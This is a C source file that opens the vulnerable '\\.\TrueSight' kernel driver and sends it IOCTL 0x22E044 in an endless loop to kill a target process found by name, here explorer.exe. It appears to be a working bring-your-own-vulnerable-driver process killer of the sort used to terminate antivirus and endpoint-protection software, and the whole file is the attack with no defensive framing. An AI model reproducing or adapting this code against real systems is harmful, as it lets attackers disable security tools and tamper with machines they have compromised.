#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>



 DWORD getPID(const char *processName) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap;
    DWORD pid = 0; //if pid not found

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("[!] Could not find PID\n");
        return 1;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcessSnap, &pe32)) {
        do {
           
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;  
                break;  
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);

    return pid;
}

int main(int argc, char *argv[]) {
	const char *processName = "explorer.exe"; //name of the proccess we want to kill
    DWORD pid = getPID(processName);

    if (pid == 0) {
        printf("[!] Could not find PID from %s\n",processName);
    }
    
    HANDLE deviceHandle = CreateFileA("\\\\.\\TrueSight", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    
    if (deviceHandle == INVALID_HANDLE_VALUE) {
        puts("[!] Failed to open driver");
        return 1;
    }
    
    
    DWORD lpBytesReturned;
    while (1){
    	pid = getPID(processName);
    	int x = DeviceIoControl(deviceHandle, 0x22E044, &pid, sizeof(DWORD), NULL, 0, &lpBytesReturned, NULL);
    	if (x != 0){
    		printf("[!] Proccess killed - %lu\n",pid);
		}else{
			printf("[!] Error killing proccess - %lu \n",pid);
		}
	}

}
